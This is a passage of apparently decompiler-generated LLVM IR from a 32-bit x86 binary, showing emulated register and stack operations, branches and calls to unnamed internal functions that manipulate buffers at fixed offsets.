  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_80527a3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_80495d1, 1
  %tmp146 = icmp eq i1 %tmp145, false
  br i1 %tmp146, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_80527a3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8051d50()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8051d50()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_8054b7a.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8051d50()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8051d50()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8051d50()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_8054b69.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8051d50()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_8054b69.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8051d50()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_8051da0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
